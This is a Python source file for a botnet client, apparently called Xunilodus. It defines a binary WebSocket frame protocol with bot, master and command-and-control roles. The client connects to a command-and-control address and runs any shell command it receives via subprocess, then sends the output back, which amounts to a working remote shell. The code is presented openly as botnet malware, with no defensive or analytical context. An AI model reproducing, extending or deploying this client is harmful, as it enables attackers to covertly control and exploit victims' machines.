#region [ DEPENDENCY IMPORTS ]

from websocket import WebSocketApp, ABNF, enableTrace
from shlex import split
import time
import json
import subprocess
try:
  import thread
except ImportError:
  import _thread as thread

#endregion

#region [ UTILITY FUNCTIONS ]

def enum(**enums):
  return type('Enum', (), enums)

def bytes_to_int(bytes):
  result = 0
  for b in bytes:
    result = result * 256 + int(b)
  return result

def int_to_bytes(length, value):
  result = []
  for i in range(0, length // 8):
    result.append(value >> (i * 8) & 0xff)
  result.reverse()
  return result

def ShellExecute(command, callback, flags):
  try:
    popenObj = subprocess.Popen(split(command, posix=True), shell=True, stdout=subprocess.PIPE, encoding='utf-8')
    stdout = popenObj.communicate()[0]
    callback(stdout)
  except Exception:
    callback('Error while executing the command. Output not returned.')

#endregion

#region [ ENUMERATIONS AND CONSTANTS ]

XUNILODUS_REMOTE_ADDRESS = "ws://192.168.0.10:44335"

MESSAGE_TYPE_POS        = 0
SEQUENCE_ID_POS         = 2
SENDER_TYPE_POS         = 6
TARGET_FINGERPRINT_POS  = 8
COMMAND_FLAGS_POS       = 12
RESERVED_FIELD_POS      = 14
STATUS_CODE_POS         = 16
COMMAND_ID_POS          = 18
SENDER_SIGNATURE_POS    = 20
TIMESTAMP_POS           = 24

MessageType = enum(
  QUERY = 0x01,
  RESPONSE = 0x02
)

SenderType = enum(
  BOT = 0x01,
  MASTER = 0x7f,
  COMMAND_CONTROL = 0xff
)

CommandFlags = enum(
  INVISIBLE = 0x01,
  VISIBLE = 0x02,
  MAXIMIZED = 0x04,
  MINIMIZED = 0x08
)

StatusCode = enum(
  QUERY_SENT = 0x01,
  QUERY_AND_WAIT = 0x02,
  QUERY_INFO = 0x04,
  RESPONSE_SENT = 0x08,
  RESPONSE_WAIT_FRAGMENT = 0x10,
  RESPONSE_INFO = 0x20,
  ERROR_STATUS = 0x40
)

CommandID = enum(
  IMPERSONATE = 0x01,
  DEPERSONATE = 0x02,
  HELP = 0x04,
  LIST_BOTS = 0x08,
  EXECUTE_SHELLCODE = 0x10,
)

#endregion

#region [ SINGLE FRAME BOTNET TRANSMISSION PROTOCOL ]

class BotnetFrame:

  def __init__(self, rawBytes):
    if (len(rawBytes) <= 32):
      raise BufferError('Invalid frame received! The frame doesnt contain a payload data section.')
    self.frameHeaderBuffer = rawBytes[:32]
    self.payloadBuffer = rawBytes[32:]

  def MessageType(self):
    return bytes_to_int(self.frameHeaderBuffer[MESSAGE_TYPE_POS:SEQUENCE_ID_POS])

  def SequenceID(self):
    return bytes_to_int(self.frameHeaderBuffer[SEQUENCE_ID_POS:SENDER_TYPE_POS])

  def SenderType(self):
    return bytes_to_int(self.frameHeaderBuffer[SENDER_TYPE_POS:TARGET_FINGERPRINT_POS])

  def TargetFingerprint(self):
    return bytes_to_int(self.frameHeaderBuffer[TARGET_FINGERPRINT_POS:COMMAND_FLAGS_POS])

  def CommandFlags(self):
    return bytes_to_int(self.frameHeaderBuffer[COMMAND_FLAGS_POS:RESERVED_FIELD_POS])

  def ReservedField(self):
    return bytes_to_int(self.frameHeaderBuffer[RESERVED_FIELD_POS:STATUS_CODE_POS])

  def StatusCode(self):
    return bytes_to_int(self.frameHeaderBuffer[STATUS_CODE_POS:COMMAND_ID_POS])

  def CommandID(self):
    return bytes_to_int(self.frameHeaderBuffer[COMMAND_ID_POS:SENDER_SIGNATURE_POS])

  def SenderSignature(self):
    return bytes_to_int(self.frameHeaderBuffer[SENDER_SIGNATURE_POS:TIMESTAMP_POS])

  def Timestamp(self):
    return bytes_to_int(self.frameHeaderBuffer[TIMESTAMP_POS:0x20])

  def Payload(self):
    return self.payloadBuffer.decode('utf-8')

  @staticmethod
  def build(MType, SeqID, SType, TargFingerprint, CFlags, Reserved, StatusCode, CommandID, SenderSig, PayloadData):
    return BotnetFrame(bytes().join([
      bytes(int_to_bytes(16, MType)),
      bytes(int_to_bytes(32, SeqID)),
      bytes(int_to_bytes(16, SType)),
      bytes(int_to_bytes(32, TargFingerprint)),
      bytes(int_to_bytes(16, CFlags)),
      bytes(int_to_bytes(16, Reserved)),
      bytes(int_to_bytes(16, StatusCode)),
      bytes(int_to_bytes(16, CommandID)),
      bytes(int_to_bytes(32, SenderSig)),
      bytes(int_to_bytes(64, int(time.time()))),
      bytes(PayloadData, 'utf-8')
    ]))

  def Bytes(self):
    return bytes().join([
      self.frameHeaderBuffer, 
      self.payloadBuffer
    ])

#endregion

#region [ WEBSOCKET EVENTS ]

def on_frame(ws, frame):
  if ((frame.MessageType() == MessageType.QUERY) and (frame.SenderType() == SenderType.COMMAND_CONTROL)):
    if (frame.StatusCode() == StatusCode.QUERY_SENT):
      if (frame.CommandID() == CommandID.EXECUTE_SHELLCODE):
        payload = json.loads(frame.Payload())
        def shell_callback(data):
          ws.send(
            BotnetFrame.build(
              MessageType.RESPONSE, frame.SequenceID(),
              SenderType.BOT, frame.TargetFingerprint(),
              frame.CommandFlags(), frame.ReservedField(),
              StatusCode.RESPONSE_SENT, frame.CommandID(),
              0xddccbbaa, json.dumps({"cmd_result": data })
            ).Bytes(), 
            opcode=ABNF.OPCODE_BINARY
          )
        thread.start_new_thread(ShellExecute, (payload['shellcode'], shell_callback, frame.CommandFlags()))
    elif (frame.StatusCode() == StatusCode.QUERY_AND_WAIT):
      #Unsupported yet
      pass

def on_message(ws, message):
  try:
    on_frame(ws, BotnetFrame(message))
  except BufferError:
    pass

def on_error(ws, error):
  print("[!] Closed connection due an error")

def on_close(ws):
  print("[!] Closed connection")

def on_open(ws):
  print("[!] Established connection")

def entry_point():
  #enableTrace(True)
  ws = WebSocketApp(
    XUNILODUS_REMOTE_ADDRESS, 
    on_message=on_message, 
    on_error=on_error, 
    on_close=on_close, 
    on_open=on_open
  )
  ws.run_forever()

if __name__ == "__main__":
  entry_point()


#endregion

